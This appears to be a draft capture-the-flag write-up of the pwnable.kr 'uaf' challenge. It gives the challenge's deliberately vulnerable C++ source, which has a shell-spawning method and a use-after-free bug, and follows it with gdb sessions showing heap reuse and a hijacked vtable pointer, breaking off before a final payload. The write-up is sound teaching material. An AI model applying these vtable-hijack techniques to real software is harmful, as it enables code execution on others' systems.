---
title: "Uaf - Pwnable.kr"
description: ""
pubDate: 2021-11-05T09:30:57+03:00
draft: true
---

# uaf | pwnable.kr

## TL;DR



Today we are gonna be solving the uaf challenge from [pwnable.kr](pwnable.kr).
The source code of the challenge is given down below.

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

As the name suggests this program has a use after free bug. If we go over
the code we can see that we have a `Human` super class, and we have two sub-classes
`Man` and `Woman` inherited from the `Human` class.

In the main functions. On the heap we allocate a `Man` object, and a `Woman` object.
Then 3 choices are presented to the user, `1` to use as in call the `introduce()`
method of both the `Man` and `Woman` objects.

Choice `2` will allocate a buffer of size `atoi(argv[1])` and copy the 
contents of the file `argv[2]` to
it. Choice `3` will `delete` the objects allocated on the heap, i.e. `Man` and `Woman`.

`new` is just a thin rapper around `malloc()`, and `delete` as well is
a thin rapper around `free()`, and we know that `malloc()` re uses memory.
So if we could some how overlap a buffer we control over the `Man` or `Woman`
objects we could alter the function pointer which points to the `introduce()`
function and make it point to where ever we want, `give_shell()` function in our
case.

Let's inspect, with gdb, how is the `Man` and `Woman` objects are placed on the
stack. We will create a breakpoint just after the two objects are created and
inspect the heap.


```txt
uaf@pwnable:~$ gdb -q ./uaf
Reading symbols from ./uaf...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
...
   0x0000000000400f13 <+79>:    call   0x401264 <_ZN3ManC2ESsi>
   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
...
   0x0000000000400f71 <+173>:   call   0x401308 <_ZN5WomanC2ESsi>
   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
...
(gdb) br *0x400f9c
```

The pointer to "Jack" is at `rbp-0x38`, and the pointer to "Jill" is at `rbp-0x30`
if examines this address we will get a heap address which I tried to make easier
to parse for the human eyes.

```txt
----------------- Jack ------------------------------
gdb-peda$ x/4gx 0x0000000001111c50

0x1111c50:      0x0000000000401570 (class Man)      0x0000000000000019 <--- age
                    |-> 0x000000000040117a (give_shell func)
                 +8 |-> 0x00000000004012d2 (jack's introduce func)
                 
0x1111c60:      0x0000000001111c38      0x0000000000000031
                    |-> ("Jack")
                
                
----------------- Jill ------------------------------
gdb-peda$ x/4gx 0x0000000001111ca0

0x1111ca0:      0x0000000000401550 (class Woman)      0x0000000000000015 <--- age
                    |-> 0x000000000040117a (give_shell func)
                 +8 |-> 0x0000000000401376 (jill's introduce func)
             
0x1111cb0:      0x0000000001111c88      0x0000000000020351
                    |-> ("Jill")
```

Let's see this for "Jack" in gdb.

```txt
gef➤  x/x $rbp-0x38
0x7ffeeb3c2a08: 0x0000000001d73ee0
gef➤  x/4gx 0x1d73ee0
0x1d73ee0:      0x0000000000401570      0x0000000000000019
0x1d73ef0:      0x0000000001d73ec8      0x0000000000000031
gef➤  x/4gx 0x401570
0x401570 <_ZTV3Man+16>: 0x000000000040117a      0x00000000004012d2
0x401580 <_ZTV5Human>:  0x0000000000000000      0x00000000004015f0
gef➤  x/4gx 0x40117a
0x40117a <_ZN5Human10give_shellEv>:     0x10ec8348e5894855      0x4014a8bff87d8948
0x40118a <_ZN5Human10give_shellEv+16>:  0xc3c9fffffb30e800      0xec834853e5894855
gef➤  x/4i 0x40117a
   0x40117a <_ZN5Human10give_shellEv>:  push   rbp
   0x40117b <_ZN5Human10give_shellEv+1>:        mov    rbp,rsp
   0x40117e <_ZN5Human10give_shellEv+4>:        sub    rsp,0x10
   0x401182 <_ZN5Human10give_shellEv+8>:        mov    QWORD PTR [rbp-0x8],rdi
gef➤  x/4gx 0x401570 + 8
0x401578 <_ZTV3Man+24>: 0x00000000004012d2      0x0000000000000000
0x401588 <_ZTV5Human+8>:        0x00000000004015f0      0x000000000040117a
gef➤  x/4gx 0x4012d2
0x4012d2 <_ZN3Man9introduceEv>: 0x10ec8348e5894855      0xf8458b48f87d8948
0x4012e2 <_ZN3Man9introduceEv+16>:      0xfffffea8e8c78948      0x2260bf004014cdbe
gef➤  x/4i 0x4012d2
   0x4012d2 <_ZN3Man9introduceEv>:      push   rbp
   0x4012d3 <_ZN3Man9introduceEv+1>:    mov    rbp,rsp
   0x4012d6 <_ZN3Man9introduceEv+4>:    sub    rsp,0x10
   0x4012da <_ZN3Man9introduceEv+8>:    mov    QWORD PTR [rbp-0x8],rdi
gef➤  x/s 0x1d73ec8
0x1d73ec8:      "Jack"
```

What this essential means is this.

```txt
$rbp-0x38 -> 0x1d73ee0 -> 0x401570 -> 0x40117a (Human's give_shell func)
$rbp-0x38 -> 0x1d73ee0 -> 0x401570 + 8 -> 0x4012d2 (Man's introduce func)
```

And for "Jill".

```txt
$rbp-0x30 -> 0x1d73f30 -> 0x401550 -> 0x40117a (Human's give_shell func)
$rbp-0x30 -> 0x1d73f30 -> 0x401550 + 8 -> 0x401376 (Woman's introduce func)
```

So the plan is simple, we just have to make, when we choose choice `2`, `malloc()`
return the address of "Jack" or "Jill" i.e. `0x1d73f30` or `0x1d73ee0`. If we free
"Jack" and "Jill" and then allocate our buffer we might get this effect, let's
check it out in gdb.

```txt
$ echo -en "AAAAAAAA" > A
(gdb) br *main+353
(gdb) r 10 A
1. use
2. after
3. free
3
1. use
2. after
3. free
2
```

Hit 3, and then 2. You should hit the breakpoint. Now let's examine if both
the `$rbp-0x38` i.e. "Jack" and `$rbp-0x20` i.e. point to the same memory
address.

```txt
(gdb) x/x $rbp-0x38
0x7fff3abe35d8: 0x023c4ee0
(gdb) x/x $rbp-0x20
0x7fff3abe35f0: 0x023c4f30
```

This is not the output we have expected maybe if we ask for one more allocation.

```txt
(gdb) c
1. use
2. after
3. free
2
(gdb) x/x $rbp-0x38
0x7fff3abe35d8: 0x023c4ee0
(gdb) x/x $rbp-0x20
0x7fff3abe35f0: 0x023c4ee0
```

Now we have what we want. I have put a file called "A" and put a bunch of "A"s
in it now let's see what happens when hit the `1`.

```
(gdb) c
1. use
2. after
3. free
1
```

The program crashes at the following line

```
0x400fd8 <main+276>       mov    rdx, QWORD PTR [rax]
```

If you examine `$rax` you will find that it has the value of `0x4141414141414149`
since this memory address does not exists `[rax]` causes the program to crash. 
notice also it has add `0x8` to our to our initial input. Which means what ever
value we want to overwrite in this place we have to subtract 0x8 from it.

You might think that now all we have to do get the address of `give_shell` and
subtract `0x8` and call it a day, if you do that your will get a segfault let's
see why. This the code that calls the `introduce()` function, let's closely 
see how does it do it.

```txt
...
   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:   add    rax,0x8
   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:   mov    rdi,rax
   0x0000000000400fe2 <+286>:   call   rdx
...
```
